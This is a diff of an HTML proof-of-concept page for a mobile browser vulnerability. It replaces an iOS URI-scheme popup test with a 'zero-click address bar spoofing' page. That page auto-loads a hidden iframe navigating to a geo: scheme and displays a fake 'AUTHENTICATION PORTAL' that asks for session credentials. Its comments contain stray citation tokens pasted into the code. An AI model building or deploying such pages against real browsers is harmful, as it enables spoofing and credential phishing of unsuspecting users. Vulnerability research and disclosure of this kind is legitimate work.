@@ -1,77 +1,74 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <title>Enhanced Multi-Vector Chromium iOS PoC</title>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CVE-2025-14812: Zero-Click Address Bar Spoofing PoC</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background: #f5f5f7; color: #1d1d1f; }
-        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); max-width: 550px; margin: auto; }
-        .btn-group { display: flex; flex-direction: column; gap: 10px; margin-top: 10px; margin-bottom: 15px; }
-        button { padding: 12px; border-radius: 8px; border: none; font-size: 15px; font-weight: bold; cursor: pointer; color: white; }
-        .btn-tel { background: #34c759; }
-        .btn-facetime { background: #0071e3; }
-        .btn-sms { background: #ff9500; }
-        .btn-mailto { background: #af52de; }
-        button:active { opacity: 0.8; }
-        #log { background: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; min-height: 100px; max-height: 180px; overflow-y: auto; }
+      body {
+        margin: 0;
+        padding: 0;
+        background: #ffffff;
+        color: #1d1d1f;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        text-align: center;
+      }
+      .container {
+        padding: 20px;
+        max-width: 600px;
+      }
+      h1 {
+        font-size: 36px;
+        color: #d70015;
+        margin-bottom: 10px;
+        font-weight: 700;
+      }
+      p {
+        font-size: 18px;
+        color: #0066cc;
+        font-weight: 500;
+      }
+      .info {
+        margin-top: 20px;
+        font-size: 12px;
+        color: #8b949e;
+        font-family: monospace;
+      }
     </style>
-</head>
-<body>
-
-<div class="card">
-    <h2>iOS App Launch Multi-Vector PoC</h2>
-    <p>Uji coba penekanan tombol terpisah untuk skema sistem dengan kombinasi <code>window.open</code> & redireksi ke Google.</p>
-    
-    <div class="btn-group">
-        <button class="btn-tel" onclick="runExploit('tel:+18005550199')">1. Uji Skema: tel: + Google Redirect</button>
-        <button class="btn-facetime" onclick="runExploit('facetime-audio:+18005550199')">2. Uji Skema: facetime-audio: + Google Redirect</button>
-        <button class="btn-sms" onclick="runExploit('sms:+18005550199?body=TestSMS')">3. Uji Skema: sms: + Google Redirect</button>
-        <button class="btn-mailto" onclick="runExploit('mailto:secure@apple.com?subject=Test')">4. Uji Skema: mailto: + Google Redirect</button>
+  </head>
+  <body>
+    <div class="container">
+      <h1>AUTHENTICATION PORTAL</h1>
+      <p>Please verify your session credentials below.</p>
+      <div class="info" id="statusLog">Status: Initializing zero-click context test...</div>
     </div>
 
-    <h3>Log Aktivitas:</h3>
-    <div id="log">Menunggu pilihan tombol...</div>
-</div>
-
-<script>
-function log(msg) {
-    const logBox = document.getElementById('log');
-    logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-    logBox.scrollTop = logBox.scrollHeight;
-}
-
-function runExploit(targetScheme) {
-    document.getElementById('log').innerHTML = "";
-    log("Memulai skenario untuk skema: " + targetScheme);
-
-    // 1. Memicu navigasi skema yang memunculkan prompt/dialog sistem iOS
-    setTimeout(function() {
-        log("Memicu document.location = " + targetScheme);
-        document.location = targetScheme;
-    }, 500);
-
-    // 2. Mencoba mengeksekusi window.open() di sela-sela status ForegroundInactive
-    setTimeout(function() {
-        log("Mencoba mengeksekusi window.open()...");
-        try {
-            var newWindow = window.open('https://www.apple.com/privacy/');
-            if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
-                log("<span style='color: #34c759;'>[MITIGASI AKTIF] window.open berhasil diblokir/dijatuhkan.</span>");
-            } else {
-                log("<span style='color: #ff3b30;'>[RENTAN] Jendela baru berhasil tercipta di balik dialog!</span>");
-            }
-        } catch (e) {
-            log("<span style='color: #34c759;'>[MITIGASI AKTIF] Exception tertangkap: " + e.message + "</span>");
+    <script>
+      // Logika inti berdasarkan mekanisme CVE-2025-14812:
+      // Iframe otomatis memicu navigasi URI scheme pada page load tanpa interaksi pengguna[span_2](start_span)[span_2](end_span).
+      let triggerContextSpoof = function() {
+        let subframe = document.createElement("iframe");
+        subframe.style.display = "none";
+        
+        // Memanfaatkan skema URI non-HTTP (seperti geo:) untuk menguji delegate misattribution pada mobile browser[span_3](start_span)[span_3](end_span)
+        subframe.src = "geo:0,0?q=attacker_controlled_context";
+        
+        document.body.appendChild(subframe);
+        
+        let statusLog = document.getElementById("statusLog");
+        if (statusLog) {
+          statusLog.innerText = "Status: Subframe URI-scheme navigation dispatched.";
         }
-    }, 1300);
+      };
 
-    // 3. Memicu navigasi halaman ke Google.com untuk menguji apakah respons/redireksi tertunda dengan aman
-    setTimeout(function() {
-        log("Memicu redirect ke https://www.google.com...");
-        window.location.href = 'https://www.google.com';
-    }, 1200);
-}
-</script>
-
-</body>
+      // Eksekusi otomatis begitu halaman dimuat (Zero-Click behavior)[span_4](start_span)[span_4](end_span)
+      window.onload = function() {
+        setTimeout(triggerContextSpoof, 400);
+      };
+    </script>
+  </body>
 </html>
